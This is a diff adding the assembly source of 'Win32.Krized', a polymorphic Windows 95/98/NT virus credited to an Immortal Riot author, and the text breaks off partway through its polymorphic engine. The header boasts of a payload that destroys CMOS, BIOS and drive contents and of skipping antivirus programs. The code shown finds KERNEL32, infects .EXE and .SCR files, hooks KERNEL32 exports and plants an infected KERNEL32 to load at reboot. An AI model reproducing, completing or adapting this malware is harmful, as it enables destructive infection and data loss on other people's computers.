@@ -1,0 +1,2043 @@
+;============================================================================
+;
+;
+;       NAME: Win32.Krized v1.01
+;       TYPE: Parasitic resident polymorphic K32/PE-infector.
+;         OS: Windoze 95/98/NT.
+;       SIZE: Around 3700 bytes.
+;     AUTHOR: T-2000 / Immortal Riot.
+;     E-MAIL: T2000_@hotmail.com
+;       DATE: April 1999 - June 1999.
+;    PAYLOAD: Trashes CMOS/BIOS/drives with X-mas.
+;
+;
+;   FEATURES:
+;
+;       - Completely Win32-compatible.
+;       - Polymorphic encrypted in files.
+;       - Traps possible errors with SEH's.
+;       - Sets correct header-checksum when needed.
+;       - Avoids infecting various AV-programs.
+;       - Win9x-payload: ring-0 CMOS & BIOS-trashing.
+;       - Win32-payload: tree-trashing.
+;
+;
+; Succesfully tested under Windoze 95, 98, and NT 4.0, failed to work
+; under beta 3 of Windoze 2000, not my fault tho, lotsa legal proggies
+; are having trouble with it too.
+;
+; Had to rip the CRC-routines from Heretic and the flasher from CIH as
+; I didn't have the time nor info to code my own :(
+;
+; Greets to Metal Militia, The Unforgiven, Johnny Panic, Bad Spirit,
+; The Lich, LovinGod, and Lord Julus.
+;
+;============================================================================
+
+
+		ORG     0
+
+
+		.386p
+		.MODEL  FLAT
+		.CODE
+
+
+EXTRN           ExitProcess:PROC                ; Only used by the carrier.
+
+
+		; *** Various equates we use. ***
+
+MOVEFILE_REPLACE_EXISTING       EQU     00000001h
+MOVEFILE_DELAY_UNTIL_REBOOT     EQU     00000004h
+
+DRIVE_FIXED                     EQU     00000003h
+DRIVE_REMOTE                    EQU     00000004h
+
+GENERIC_READ                    EQU     80000000h
+GENERIC_WRITE                   EQU     40000000h
+OPEN_EXISTING                   EQU     00000003h
+FILE_ATTRIBUTE_NORMAL           EQU     00000080h
+PAGE_READONLY                   EQU     00000002h
+PAGE_READWRITE                  EQU     00000004h
+FILE_MAP_READ                   EQU     00000004h
+FILE_MAP_WRITE                  EQU     00000002h
+
+Virus_Size                      EQU     (Virus_End-START)
+Poly_Size                       EQU     200     ; Maximum size of generated
+						; polymorphic decryptors.
+
+Work_API_Count                  EQU     (End_Work_API_CRC-Work_API_CRC) / 2
+Hook_API_Count                  EQU     (Work_API_CRC-Hook_API_CRC) / 2
+Immune_CRC_Count                EQU     (End_Immune_Table-Immune_Table) / 2
+
+
+; Equates used to index the API address table.
+
+ixCopyFileA                     EQU     (00 * 4)
+ixCreateFileA                   EQU     (01 * 4)
+ixCreateProcessA                EQU     (02 * 4)
+ixDeleteFileA                   EQU     (03 * 4)
+ixGetFileAttributesA            EQU     (04 * 4)
+ixMoveFileA                     EQU     (05 * 4)
+ixMoveFileExA                   EQU     (06 * 4)
+ixSetFileAttributesA            EQU     (07 * 4)
+
+ixCopyFileW                     EQU     (08 * 4)
+ixCreateFileW                   EQU     (09 * 4)
+ixCreateProcessW                EQU     (10 * 4)
+ixDeleteFileW                   EQU     (11 * 4)
+ixGetFileAttributesW            EQU     (12 * 4)
+ixMoveFileW                     EQU     (13 * 4)
+ixMoveFileExW                   EQU     (14 * 4)
+ixSetFileAttributesW            EQU     (15 * 4)
+
+ixCloseHandle                   EQU     (16 * 4)
+ixCreateFileMappingA            EQU     (17 * 4)
+ixFindClose                     EQU     (18 * 4)
+ixFindFirstFileA                EQU     (19 * 4)
+ixFindNextFileA                 EQU     (20 * 4)
+ixFreeLibrary                   EQU     (21 * 4)
+ixGetCurrentDirectoryA          EQU     (22 * 4)
+ixGetDriveTypeA                 EQU     (23 * 4)
+ixGetFileSize                   EQU     (24 * 4)
+ixGetFileTime                   EQU     (25 * 4)
+ixGetLocalTime                  EQU     (26 * 4)
+ixGetLogicalDriveStringsA       EQU     (27 * 4)
+ixGetProcAddress                EQU     (28 * 4)
+ixGetSystemDirectoryA           EQU     (29 * 4)
+ixGetTickCount                  EQU     (30 * 4)
+ixGetWindowsDirectoryA          EQU     (31 * 4)
+ixGlobalAlloc                   EQU     (32 * 4)
+ixGlobalFree                    EQU     (33 * 4)
+ixLoadLibraryA                  EQU     (34 * 4)
+ixMapViewOfFile                 EQU     (35 * 4)
+ixSetCurrentDirectoryA          EQU     (36 * 4)
+ixSetFileTime                   EQU     (37 * 4)
+ixUnmapViewOfFile               EQU     (38 * 4)
+ixWriteFile                     EQU     (39 * 4)
+ixWritePrivateProfileStringA    EQU     (40 * 4)
+
+
+
+CRC16           MACRO   String
+    crcReg = 0FFFFFFFFh
+    irpc _x, <String>
+	ctrlByte = '&_x&' xor (crcReg and 0ffh)
+	crcReg = crcReg shr 8
+	rept 8
+	    ctrlByte = (ctrlByte shr 1) XOR (0EDB88320h * (ctrlByte and 1))
+	endm
+	crcReg = crcReg XOR ctrlByte
+    endm
+    dw  (crcReg and 0FFFFh)
+ENDM
+
+
+
+		; === VIRUSCODE STARTS HERE ===
+START:
+		CALL    Get_Delta
+
+		XOR     EDX, EDX
+                JNZ     $+666h
+
+		; Zero the key of the decryptor, so the
+		; code won't be fucked-up the next time
+		; DLLMain get's called.
+
+		MOV     [EBP+(Stupid_Dummy-START)], DL
+Patch_Decrypt   =       DWORD PTR $-4
+
+		MOV     EAX, EBP
+
+		SUB     EAX, 1000h              ; Calculate our base-address.
+Virus_RVA       =       DWORD PTR $-4
+
+		; Calculate VA of our host.
+
+		ADD     EAX, (1000h+(Carrier-START))
+Host_EIP        =       DWORD PTR $-4
+
+		MOV     [ESP+(9*4)], EAX        ; Patch return-address with
+						; original entrypoint.
+
+                CALL    Setup_Load_SEH          ; Bump SEH-address on stack.
+
+                MOV     ESP, [ESP+(2*4)]        ; Restore original ESP.
+
+                JMP     JMP_Ret_Host            ; And end further processing.
+
+Copyright       DB      '=( [c] 1999 [t] )=', 0 ; Ph33r!
+
+Setup_Load_SEH: PUSH    DWORD PTR FS:[EDX]      ; Bump original SEH on stack.
+                MOV     FS:[EDX], ESP           ; Stuff our own SEH-address.
+
+                JMP     $+2                     ; Abort further processing?
+Init_Mode       =       BYTE PTR $-1
+
+Init_Find_Base: MOV     EAX, [ESP+(12*4)]       ; Get pointer to last SEH.
+
+		XOR     AX, AX                  ; Align on a 64k boundary.
+
+Find_K32_Base:  CMP     EAX, 400000h            ; Below application-memory?
+		JNB     Verify_K32              ; Else just continue.
+
+JMP_Ret_Host:   JMP     Return_To_Host
+
+Verify_K32:     CMP     [EAX.MZ_Mark], 'ZM'     ; Found the kernel?
+		JNE     Loop_Find_K32
+
+		CMP     [EAX.MZ_Reloc_Table], 40h  ; K32 has a PE-header.
+		JB      Loop_Find_K32
+
+		MOV     EBX, [EAX+3Ch]          ; RVA of PE-header.
+		ADD     EBX, EAX                ; Plus base, (make it a VA).
+
+		CMP     [EBX.PE_Mark], 'EP'     ; Verify PE-header, just in
+		JNE     Loop_Find_K32           ; case.
+
+		; Verify it's a DLL we've found.
+
+		TEST    BYTE PTR [EBX.PE_Flags+1], 00100000b
+		JNZ     Found_K32_Base
+
+Loop_Find_K32:  SUB     EAX, 65536              ; Scan downwards, stuff
+                                                ; always gets loaded at
+                                                ; a 64k boundary.
+
+		JMP     Find_K32_Base           ; Just repeat the loop.
+
+Found_K32_Base: MOV     [EBP+(K32_Base-START)], EAX     ; Store K32-base.
+
+		MOV     EBX, [EBX+120]          ; K32's export-table.
+		ADD     EBX, EAX
+
+                MOV     EDI, [EBX+(8*4)]        ; Array of API-name RVA's.
+                ADD     EDI, EAX
+
+                MOV     ECX, [EBX+(6*4)]        ; Amount of API-name RVA's.
+
+		MOV     BYTE PTR [EBP+(Fetched_API-START)], (Hook_API_Count + Work_API_Count)
+
+Loop_Export:    MOV     ESI, [EDI+(EDX*4)]      ; Offset of API-name.
+		ADD     ESI, EAX
+
+		PUSHAD
+
+		XCHG    ECX, EAX                ; Save base-address in ECX.
+
+		CALL    Calculate_CRC16         ; Calculate the CRC16 of this
+                                                ; API-name.
+
+                MOV     ESI, [EBX+(9*4)]        ; Array of API-ordinals.
+		ADD     ESI, ECX
+
+                MOV     EBX, [EBX+(7*4)]        ; Array of API-handler RVA's.
+
+		PUSH    EAX
+
+		MOVZX   EAX, WORD PTR [ESI+(EDX*2)]
+
+		LEA     ESI, [EBX+(EAX*4)]
+
+		MOV     EBX, [ECX+ESI]
+
+		POP     EAX
+
+		; Check if it's an API which we need.
+
+		LEA     EDI, [EBP+(Hook_API_CRC-START)]
+		PUSH    (Hook_API_Count+Work_API_Count)
+		POP     ECX
+		PUSH    ECX
+		REPNE   SCASW
+
+		POP     EAX
+
+		JNE     Rep_Loop_Name
+
+		SUB     EAX, ECX
+
+		; Save API-address.
+
+		MOV     [EBP+(API_Addresses-START)+(EAX*4)-4], EBX
+
+		; Got another one.
+
+		DEC     BYTE PTR [EBP+(Fetched_API-START)]
+
+		CMP     AL, Hook_API_Count+1    ; Do we need to save this
+		JNB     Rep_Loop_Name           ; API's export-address?
+
+		MOV     [EBP+(Hook_Exports-START)+(EAX*4)-4], ESI
+
+Rep_Loop_Name:  POPAD
+
+		INC     EDX
+
+		LOOP    Loop_Export
+
+		CMP     CL, 0                   ; We're all API's found?
+Fetched_API     =       BYTE PTR $-1
+		JNZ     Return_To_Host          ; Else abort further infect.
+
+		PUSH    0FFFFFFFFh              ; Request for kernel-infect.
+		POP     EDI
+		CALL    Infect_File
+
+Return_To_Host: XOR     EAX, EAX
+
+		POP     DWORD PTR FS:[EAX]      ; Unhook our own SEH.
+		POP     EAX
+
+                POPAD                           ; Restore all registers.
+		POPFD
+
+		RET                             ; Return to our host.
+
+
+
+;-------------------------------------------------
+; EDI == 0FFFFFFFFh = Infect kernel.
+; EDI != 0FFFFFFFFh = Infect file pointed by EDI.
+;-------------------------------------------------
+Infect_File:
+		NOP
+Busy_Switch     =       BYTE PTR $-1
+
+                MOV     BYTE PTR [EBP+(Busy_Switch-START)], 0C3h  ; RET.
+
+		PUSHAD
+
+		XOR     EBX, EBX
+
+		CALL    Setup_Inf_SEH
+
+		MOV     ESP, [ESP+(2*4)]
+
+JMP_R_Inf_SEH:  JMP     Rest_Inf_SEH
+
+Setup_Inf_SEH:  PUSH    DWORD PTR FS:[EBX]
+		MOV     FS:[EBX], ESP
+
+        ; The virtual-size entry of object-headers is not reliable,
+        ; therefore we need to allocate our memory by hand.
+
+		PUSH    (End_Heap-Virus_End)    ; Allocate memory on the
+		PUSH    EBX                     ; global heap.
+		MOV     AL, ixGlobalAlloc
+		CALL    Perform_API
+
+                XCHG    ECX, EAX                ; Error?
+		JECXZ   JMP_R_Inf_SEH
+
+		MOV     [EBP+(Global_Handle-START)], ECX
+
+		MOV     [EBP+(Infect_Mode-START)], BL
+
+		MOV     ESI, EDI
+
+		INC     ESI                     ; Request to infect K32 ?
+		JZ      Payload_Test
+
+		DEC     ESI                     ; Some API can have NULL.
+		JZ      JMP_Free_Glo_M
+
+		MOV     BYTE PTR [EBP+(Infect_Mode-START)], (Open_Candidate-Infect_Mode) - 1
+
+		LEA     EBX, [ECX+(ANSI_Target_File-Virus_End)]
+
+		MOV     EDI, EBX
+
+		XOR     AH, AH
+
+		MOV     ECX, 260
+
+Convert_Path:   LODSB
+		NOP
+Unicode_Switch  =       WORD PTR $-2
+
+		OR      AH, AH                  ; Is it non-ASCII  ?
+		JNZ     JMP_Free_Glo_M          ; Then abort infect.
+
+		CMP     AL, 'a'
+		JB      Store_Upcase
+
+		CMP     AL, 'z'
+		JA      Store_Upcase
+
+		SUB     AL, 'a' - 'A'
+Store_Upcase:   STOSB
+
+		OR      AL, AL
+		JZ      Init_Find_Name
+
+		LOOP    Convert_Path
+
+JMP_Free_Glo_M: JMP     Free_Global_M
+
+Init_Find_Name: MOV     ESI, EDI
+
+Find_File_Name: DEC     ESI
+
+		CMP     ESI, EBX
+		JE      Check_File_Ext
+
+		CMP     BYTE PTR [ESI-1], '\'   ; Found start filename?
+		JNE     Find_File_Name
+
+Check_File_Ext: CMP     [EDI-5], 'EXE.'         ; Standard .EXE-file?
+		JE      Calc_CRC_Name
+
+		CMP     [EDI-5], 'RCS.'         ; Perhaps a screen-saver?
+		JNE     JMP_Free_Glo_M
+
+Calc_CRC_Name:  CALL    Calculate_CRC16         ; Calculate filename's CRC.
+
+		; Avoid infecting various AV's.
+
+		LEA     EDI, [EBP+(Immune_Table-START)]
+		PUSH    Immune_CRC_Count
+		POP     ECX
+		REPNE   SCASW
+		JE      JMP_Free_Glo_M
+
+Payload_Test:   CALL    Check_For_Payload       ; Activate?
+
+		LEA     EDI, [EBP+(Perform_API-START)]
+
+		CALL    @1                      ; Load this DLL we need.
+		DB      'IMAGEHLP', 0
+@1:             MOV     AL, ixLoadLibraryA
+		CALL    EDI
+
+		XCHG    ECX, EAX                ; Abort of an error occurred.
+		JECXZ   JMP_Free_Glo_M
+
+		MOV     [EBP+(IMAGEHLP_Handle-START)], ECX
+
+		MOV     BYTE PTR [EBP+(Clear_Tracks_Sw-START)], (Free_Global_M-Clear_Tracks_Sw) - 1
+
+		JMP     $
+Infect_Mode     =       BYTE PTR $-1
+
+		PUSH    EDI
+
+		MOV     EBX, [EBP+(Global_Handle-START)]
+
+		PUSH    260
+		LEA     ESI, [EBX+(Clean_K32_Path-Virus_End)]
+		PUSH    ESI
+		MOV     AL, ixGetSystemDirectoryA
+		CALL    EDI
+
+		LEA     EDI, [EBX+(Infected_K32_Path-Virus_End)]
+
+		PUSH    EDI
+
+		XCHG    ECX, EAX
+		CLD
+		REP     MOVSB
+
+		PUSH    ESI
+
+		LEA     ESI, [EBP+(Infected_K32-START)]
+
+		MOVSD
+		MOVSD
+		MOVSD
+
+		POP     EDI
+
+		LEA     ESI, [EBP+(KERNEL32_Name-START)]
+                MOV     CL, 14
+		REP     MOVSB
+
+		PUSH    1
+		LEA     EAX, [EBX+(Infected_K32_Path-Virus_End)]
+		PUSH    EAX
+		LEA     EAX, [EBX+(Clean_K32_Path-Virus_End)]
+		PUSH    EAX
+		MOV     AL, ixCopyFileA
+		CALL    Perform_API
+
+		POP     EBX
+
+		POP     EDI
+
+		DEC     EAX
+		JNZ     Free_Global_M
+
+		MOV     [EBP+(Clear_Tracks_Sw-START)], AL
+
+Open_Candidate: XOR     ESI, ESI
+
+		PUSH    EBX
+		MOV     AL, ixGetFileAttributesA
+		CALL    EDI
+
+		CMP     EAX, -1
+		JE      Free_IMAGEHLP
+
+		PUSH    EAX
+		PUSH    EBX
+
+		AND     AL, NOT 00000001b       ; Readonly my ass...
+
+		PUSH    EAX
+		PUSH    EBX
+		MOV     AL, ixSetFileAttributesA
+		CALL    EDI
+
+                OR      EAX, EAX
+                JZ      Restore_Attr
+
+		PUSH    ESI
+		PUSH    FILE_ATTRIBUTE_NORMAL
+		PUSH    OPEN_EXISTING
+		PUSH    ESI
+		PUSH    ESI
+		PUSH    GENERIC_READ OR GENERIC_WRITE
+		PUSH    EBX
+		MOV     AL, ixCreateFileA
+		CALL    EDI
+
+		MOV     [EBP+(File_Handle-START)], EAX
+
+		INC     EAX
+                JZ      Restore_Attr
+
+		MOV     EAX, [EBP+(Global_Handle-START)]
+
+		ADD     EAX, (Time_Last_Write-Virus_End)
+		PUSH    EAX
+		SUB     EAX, 8
+		PUSH    EAX
+		SUB     EAX, 8
+		PUSH    EAX
+		PUSH    DWORD PTR [EBP+(File_Handle-START)]
+		MOV     AL, ixGetFileTime
+		CALL    EDI
+
+		PUSH    ESI                     ; Map whole file.
+		PUSH    ESI
+		PUSH    ESI
+		PUSH    PAGE_READONLY
+		PUSH    ESI                     ; Standard security.
+		PUSH    DWORD PTR [EBP+(File_Handle-START)]
+		MOV     AL, ixCreateFileMappingA
+		CALL    EDI
+
+		OR      EAX, EAX
+		JZ      Close_File
+
+		MOV     [EBP+(Map_Handle-START)], EAX
+
+		PUSH    ESI
+		PUSH    ESI
+		PUSH    ESI
+		PUSH    FILE_MAP_READ
+		PUSH    DWORD PTR [EBP+(Map_Handle-START)]
+		MOV     AL, ixMapViewOfFile
+		CALL    EDI
+
+		OR      EAX, EAX
+		JZ      Close_Mapping
+
+		MOV     [EBP+(Map_Address-START)], EAX
+
+		XCHG    EBX, EAX
+
+		PUSH    ESI
+		PUSH    DWORD PTR [EBP+(File_Handle-START)]
+		MOV     AL, ixGetFileSize
+		CALL    EDI
+
+		CMP     EAX, 4096               ; Avoid too small files.
+		JB      Abort_Checks
+
+		CMP     [EBX.MZ_Mark], 'ZM'     ; It must be an .EXE-file.
+		JNE     Abort_Checks
+
+		CMP     [EBX.MZ_Reloc_Table], 40h  ; External header present?
+		JB      Abort_Checks
+
+		ADD     EBX, [EBX+3Ch]          ; Obtain pointer PE-header.
+
+		CMP     [EBX.PE_Mark], 'EP'     ; PE-header is really there?
+		JNE     Abort_Checks
+
+		CMP     BYTE PTR [EBP+(Infect_Mode-START)], 0
+		JZ      Check_Our_Mark
+
+		; Don't infect non-K32 DLL's.
+
+		TEST    BYTE PTR [EBX.PE_Flags+1], 00100000b
+		JNZ     Abort_Checks
+
+Check_Our_Mark: CMP     [EBX.PE_Reserved_5], '666'      ; Already infected?
+		JE      Abort_Checks
+
+		ADD     EAX, Virus_Size + Poly_Size
+		MOV     ECX, [EBX.File_Align]
+		CALL    Align_EAX
+
+		MOV     [EBP+(Infected_Size-START)], EAX
+
+		INC     ESI                     ; Mark as a valid candidate.
+
+Abort_Checks:   PUSH    DWORD PTR [EBP+(Map_Address-START)]
+		MOV     AL, ixUnmapViewOfFile
+		CALL    EDI
+
+		PUSH    DWORD PTR [EBP+(Map_Handle-START)]
+		MOV     AL, ixCloseHandle
+		CALL    EDI
+
+		DEC     ESI                     ; Valid host?
+		JNZ     Close_File
+
+		PUSH    ESI
+		PUSH    DWORD PTR [EBP+(Infected_Size-START)]
+		PUSH    ESI
+		PUSH    PAGE_READWRITE
+		PUSH    ESI                     ; Standard security.
+		PUSH    DWORD PTR [EBP+(File_Handle-START)]
+		MOV     AL, ixCreateFileMappingA
+		CALL    EDI
+
+		OR      EAX, EAX
+		JZ      Close_File
+
+		MOV     [EBP+(Map_Handle-START)], EAX
+
+		PUSH    ESI
+		PUSH    ESI
+		PUSH    ESI
+		PUSH    FILE_MAP_WRITE
+		PUSH    DWORD PTR [EBP+(Map_Handle-START)]
+		MOV     AL, ixMapViewOfFile
+		CALL    EDI
+
+		MOV     [EBP+(Map_Address-START)], EAX
+
+		OR      EAX, EAX
+		JZ      Close_Mapping
+
+		XCHG    EDI, EAX                ; Base of mapped candidate.
+
+		MOV     EBX, [EDI+3Ch]          ; PE-header of our candidate.
+		ADD     EBX, EDI
+
+		MOVZX   EAX, [EBX.Object_Count] ; Calculate the size of all
+		PUSH    40                      ; sections combined.
+		POP     ECX
+		MUL     ECX
+
+		INC     [EBX.Object_Count]      ; Add our own section.
+
+		; Size of formatted header.
+
+		MOVZX   EDX, [EBX.NT_Header_Size]
+		ADD     EDX, 24
+
+		LEA     EDI, [EBX+EDX]
+		ADD     EDI, EAX
+
+        ; Testing under Windoze NT showed that an added section
+        ; containing 4 or more characters in it's section-name
+        ; caused the system to crash, this does not happen under
+        ; Win9x... Fuqin weird!
+
+                MOV     EAX, '...'              ; Virus' section-name.
+
+		MOV     CL, 9
+
+Store_DWORD:    STOSD
+
+		XOR     EAX, EAX
+
+		LOOP    Store_DWORD
+
+		; Readable/writeable/shareable.
+
+		MOV     EAX, 11010000000000000000000000000000b
+		STOSD
+
+		MOV     EAX, [EDI.Section_Virtual_Size-80]
+		MOV     ECX, [EBX.Object_Align]
+		CALL    Align_EAX
+
+		ADD     EAX, [EDI.Section_RVA-80]
+
+		MOV     [EDI.Section_RVA-40], EAX
+
+		PUSH    EAX
+
+		MOV     EAX, [EDI.Section_Physical_Offset-80]
+		ADD     EAX, [EDI.Section_Physical_Size-80]
+
+		MOV     [EDI.Section_Physical_Offset-40], EAX
+
+		PUSH    EAX
+
+		MOV     EAX, Virus_Size + Poly_Size
+
+		PUSH    EAX
+
+		CALL    Align_EAX
+
+		MOV     [EDI.Section_Virtual_Size-40], EAX
+
+		ADD     [EBX.Image_Size], EAX
+
+		POP     EAX
+
+		MOV     ECX, [EBX.File_Align]
+		CALL    Align_EAX
+
+		MOV     [EDI.Section_Physical_Size-40], EAX
+
+		POP     EDI
+		POP     EAX
+
+		MOV     EDX, EAX
+
+                MOV     [EBX.PE_Reserved_5], '666'      ; Set infected mark.
+
+		XCHG    [EBX.EIP_RVA], EAX
+
+		ADD     EDI, [EBP+(Map_Address-START)]
+
+		CALL    Poly_Engine
+
+		CMP     BYTE PTR [EBP+(Infect_Mode-START)], 0
+		JNZ     Fix_Checksum
+
+		MOV     ESI, [EBP+(Global_Handle-START)]
+
+		; Notify DLL of PROCESS_ATTACH, this is always
+		; done regardless of these flags, but I rather
+		; waste some bytes playing safe.
+
+		OR      BYTE PTR [EBX.DLL_Flags], 00000001b
+
+                ; Now change the exports of K32 to point
+                ; to the virus' own handlers.
+
+		CALL    @2
+		DB      'ImageRvaToVa', 0
+@2:             PUSH    DWORD PTR [EBP+(IMAGEHLP_Handle-START)]
+		MOV     AL, ixGetProcAddress
+		CALL    Perform_API
+
+		MOV     [EBP+(ImageRvaToVa-START)], EAX
+
+		PUSH    Hook_API_Count
+		POP     ECX
+
+		LEA     ESI, [EBP+(Hook_Exports-START)]
+
+Hook_Export:    CLD                             ; Get array entry in export.
+		LODSD
+
+		PUSHAD
+
+		PUSH    Hook_API_Count
+		POP     EDI
+
+		SUB     EDI, ECX
+
+		PUSH    0
+		PUSH    EAX
+		PUSH    DWORD PTR [EBP+(Map_Address-START)]
+		PUSH    EBX
+		CALL    [EBP+(ImageRvaToVa-START)]
+
+		XCHG    ECX, EAX
+		JECXZ   Cont_Hook_Loop
+
+		MOVZX   EDX, WORD PTR [EBP+(Dispatch_API-START)+(EDI*2)]
+
+		ADD     EDX, 27863762h
+New_Virus_RVA   =       DWORD PTR $-4
+
+		MOV     [ECX], EDX
+
+Cont_Hook_Loop: POPAD
+
+		LOOP    Hook_Export
+
+		MOV     ESI, [EBP+(Global_Handle-START)]
+
+                ; Attemp to register a file-update to replace the
+		; original KERNEL32.DLL with the infected one at
+		; the next boot-up.
+
+		PUSH    MOVEFILE_DELAY_UNTIL_REBOOT OR MOVEFILE_REPLACE_EXISTING
+		LEA     EAX, [ESI+(Clean_K32_Path-Virus_End)]
+		PUSH    EAX
+		LEA     EAX, [ESI+(Infected_K32_Path-Virus_End)]
+		PUSH    EAX
+		MOV     AL, ixMoveFileExA
+		CALL    Perform_API
+
+		DEC     EAX                     ; Function accepted (WinNT) ?
+		JZ      Fix_Checksum
+
+		; Else do it the Win9x-way...
+
+		CALL    @3
+		DB      'WININIT.INI', 0
+@3:             LEA     EAX, [ESI+(Infected_K32_Path-Virus_End)]
+		PUSH    EAX
+		LEA     EAX, [ESI+(Clean_K32_Path-Virus_End)]
+		PUSH    EAX
+		CALL    @4
+		DB      'rename', 0
+@4:             MOV     AL, ixWritePrivateProfileStringA
+		CALL    Perform_API
+
+Fix_Checksum:   CMP     [EBX.PE_Checksum], 0    ; This file is checksummed?
+		JZ      Init_Succesful
+
+		CALL    @5
+		DB      'CheckSumMappedFile', 0
+@5:             PUSH    DWORD PTR [EBP+(IMAGEHLP_Handle-START)]
+		MOV     AL, ixGetProcAddress
+		CALL    Perform_API
+
+		XCHG    ECX, EAX                ; Function found?
+		JECXZ   Unmap_View
+
+		LEA     EAX, [EBX.PE_Checksum]  ; Calculate new checksum.
+		PUSH    EAX
+		PUSH    EAX
+		PUSH    12345678h
+Infected_Size   =       DWORD PTR $-4
+		PUSH    DWORD PTR [EBP+(Map_Address-START)]
+		CALL    ECX
+
+Init_Succesful: MOV     BYTE PTR [EBP+(Clear_Tracks_Sw-START)], (Free_Global_M-Clear_Tracks_Sw) - 1
+
+Unmap_View:     PUSH    12345678h
+Map_Address     =       DWORD PTR $-4
+		MOV     AL, ixUnmapViewOfFile
+		CALL    Perform_API
+
+Close_Mapping:  PUSH    12345678h
+Map_Handle      =       DWORD PTR $-4
+		MOV     AL, ixCloseHandle
+		CALL    Perform_API
+
+		MOV     EAX, [EBP+(Global_Handle-START)]
+
+		ADD     EAX, (Time_Last_Write-Virus_End)
+		PUSH    EAX
+		SUB     EAX, 8
+		PUSH    EAX
+		SUB     EAX, 8
+		PUSH    EAX
+		PUSH    DWORD PTR [EBP+(File_Handle-START)]
+		MOV     AL, ixSetFileTime
+		CALL    Perform_API
+
+Close_File:     PUSH    12345678h
+File_Handle     =       DWORD PTR $-4
+		MOV     AL, ixCloseHandle
+		CALL    Perform_API
+
+		; Restore the file's original attributes.
+
+Restore_Attr:   MOV     AL, ixSetFileAttributesA
+		CALL    Perform_API
+
+Free_IMAGEHLP:  PUSH    12345678h               ; Decrement usage-count.
+IMAGEHLP_Handle =       DWORD PTR $-4
+		MOV     AL, ixFreeLibrary
+		CALL    Perform_API
+
+	; If something went wrong while in the process of infecting
+	; an KERNEL32.DLL-copy, clean up our trash by deleting it.
+
+		JMP     $
+Clear_Tracks_Sw =       BYTE PTR $-1
+
+		MOV     EDI, [EBP+(Global_Handle-START)]
+		ADD     EDI, (Infected_K32_Path-Virus_End)
+		PUSH    EDI
+		MOV     AL, ixDeleteFileA
+		CALL    Perform_API
+
+Free_Global_M:  PUSH    12345678h               ; Free our global allocated
+Global_Handle   =       DWORD PTR $-4           ; memory.
+		MOV     AL, ixGlobalFree
+		CALL    Perform_API
+
+Rest_Inf_SEH:   XOR     EAX, EAX                ; Unhook our SEH.
+
+		POP     DWORD PTR FS:[EAX]
+		POP     EBX
+
+		POPAD
+
+		; Erase busy-flag.
+
+		MOV     BYTE PTR [EBP+(Busy_Switch-START)], 90h
+
+Exit_Infect:    RET
+
+
+; Some humble poly-engine, it builds decryptors with random registers
+; peppered with some simple junk. It won't keep-out the average AV,
+; but it's effective against public-domain AV-scanners based on pure
+; signature-scanning.
+
+Poly_Engine:
+
+		PUSHAD
+
+		PUSH    EAX
+
+Gen_Decryptor:  MOV     EDI, [ESP+(1*4)]
+
+		PUSH    13
+		POP     EAX
+		CALL    Get_Random
+
+		MOV     AL, [EBP+(PUSH_Reg32-START)+EAX]
+		STOSB
+
+		MOV     AL, 9Ch                 ; PUSHFD
+		STOSB
+
+		MOV     AL, 60h                 ; PUSHAD
+		STOSB
+
+		CALL    Add_Garbage
+
+		MOV     AL, 0E8h                ; CALL
+		STOSB
+
+		PUSH    10
+		POP     EAX
+		CALL    Get_Random
+
+		INC     EAX
+		STOSD
+
+		MOV     ESI, EDI
+
+		XCHG    ECX, EAX
+
+Add_Random:     MOV     EAX, ESP
+		CALL    Get_Random
+
+		STOSB
+
+		LOOP    Add_Random
+
+		PUSH    7
+		POP     EAX
+		CALL    Get_Random
+
+		XCHG    EBX, EAX
+
+		MOV     AL, [EBP+(POP_Reg32-START)+EBX]
+		STOSB
+
+		CALL    Get_Free_Reg
+
+		XCHG    EDX, EAX
+
+		CALL    Add_Garbage
+
+		MOV     AL, [EBP+(MOV_Reg32-START)+EDX]  ; MOV Cntr_Reg
+		STOSB
+
+		MOV     EAX, Virus_Size
+		STOSD
+
+		CALL    Add_Garbage
+
+		MOV     [EBP+(Decrypt_Loop-START)], EDI
+
+		CALL    Add_Garbage
+
+		MOV     AL, 0FFh
+		CALL    Get_Random
+		JP      Construct_XOR           ; 1/2 chance of including DS:
+
+		MOV     AL, 3Eh                 ; DS:
+		STOSB
+
+Construct_XOR:  MOV     AL, 80h
+		STOSB
+
+		MOV     AL, [EBP+(XOR_Ptr_Reg32-START)+EBX]
+		STOSB
+
+		MOV     [EBP+(Patch_Delta-START)], EDI
+
+		MOV     EAX, Virus_Size-1
+		STOSD
+
+Get_Random_Key: CALL    Get_Random
+
+		OR      AL, AL
+		JZ      Get_Random_Key
+
+		STOSB
+
+		PUSH    EAX
+
+		CALL    Add_Garbage
+
+		MOV     AL, [EBP+(DEC_Reg32-START)+EBX]
+		STOSB
+
+		CALL    Add_Garbage
+
+		MOV     AL, [EBP+(DEC_Reg32-START)+EDX]
+		STOSB
+
+		MOV     AL, 75h                 ; JNZ
+		STOSB
+
+		MOV     EAX, EDI
+
+		SUB     EAX, 12345678h
+Decrypt_Loop    =       DWORD PTR $-4
+		NOT     EAX
+		STOSB
+
+		POP     EDX
+
+		MOV     EAX, EDI
+		SUB     EAX, ESI
+
+		ADD     DS:[12345678h], EAX
+Patch_Delta     =       DWORD PTR $-4
+
+		MOV     EAX, EDI                ; Calculate size decryptor.
+		SUB     EAX, [ESP+(1*4)]
+
+		CMP     EAX, 140                ; Too large? Start over then.
+		JNB     Gen_Decryptor
+
+		CMP     AL, 120                 ; Too small? Ditto.
+		JB      Gen_Decryptor
+
+		PUSH    EDI
+
+		MOV     ESI, EBP
+		MOV     ECX, Virus_Size
+		REP     MOVSB
+
+		ADD     EAX, [ESP+(7*4)]        ; EDX at entry.
+
+		MOV     [EBP+(New_Virus_RVA-START)], EAX
+
+		MOV     [EDI+(Virus_RVA-START)-Virus_Size], EAX
+
+		POP     EAX
+
+		SUB     EAX, [EBP+(Patch_Delta-START)]
+
+		DEC     EAX
+		DEC     EAX
+		DEC     EAX
+		DEC     EAX
+
+		NEG     EAX
+
+		MOV     [EDI+(Patch_Decrypt-START)-Virus_Size], EAX
+
+		MOV     BYTE PTR [EDI+(Busy_Switch-START)-Virus_Size], 90h
+
+		MOV     WORD PTR [EDI+(Unicode_Switch-START)-Virus_Size], 90ACh
+
+		MOV     BYTE PTR [EDI+(Init_Mode-START)-Virus_Size], (JMP_Ret_Host-Init_Mode) - 1
+
+		CMP     [EBP+(Infect_Mode-START)], CL
+		JZ      POP_New_EIP
+
+		MOV     [EDI+(Init_Mode-START)-Virus_Size], CL
+
+POP_New_EIP:    POP     DWORD PTR [EDI+(Host_EIP-START)-Virus_Size]
+
+		MOV     ECX, Virus_Size
+
